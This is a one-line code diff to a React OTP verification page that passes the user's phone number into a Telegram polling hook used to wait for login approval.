@@ -104,6 +104,7 @@ export const OtpPage: React.FC<OtpPageProps> = ({
   // Telegram polling hook for OTP verification
   const { status: telegramStatus } = useTelegramPolling({
     sessionId,
+    phone,
     targetStep: 'otp',
     isActive: isWaitingTelegram,
     onApproved: () => {
